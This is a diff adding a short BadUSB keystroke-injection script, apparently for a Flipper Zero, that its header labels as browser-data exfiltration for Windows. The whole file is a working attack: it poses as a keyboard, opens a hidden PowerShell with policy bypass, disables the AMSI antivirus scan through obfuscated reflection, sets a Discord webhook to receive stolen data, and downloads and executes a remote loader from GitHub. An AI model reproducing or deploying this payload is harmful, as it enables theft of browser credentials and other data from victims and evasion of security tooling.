@@ -1,0 +1,19 @@
+REM ============================================================
+REM 🌐 Browser Data - Windows
+REM ============================================================
+REM Author: dil1thium
+REM Version: 3.0 (Modular)
+REM Target: Windows 10/11
+REM Category: Exfiltration
+REM
+REM Extracts browser info from Chrome/Edge/Firefox.
+REM
+REM CONFIGURE:
+REM   Replace YOUR_DISCORD_WEBHOOK with your webhook URL
+REM ============================================================
+ID 1234:5678 Manufacturer:Keyboard
+DELAY 500
+GUI r
+DELAY 400
+STRING powershell -w h -ep bypass "$a=[Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils');$f=$a.GetField('amsi'+'InitFailed','NonPublic,Static');$f.SetValue($null,$true);$env:DC='YOUR_DISCORD_WEBHOOK';$env:M='browser';irm https://raw.githubusercontent.com/reschjonas/FlipperZero_BadUSB/main/remote-payloads/loaders/loader.ps1|iex"
+ENTER
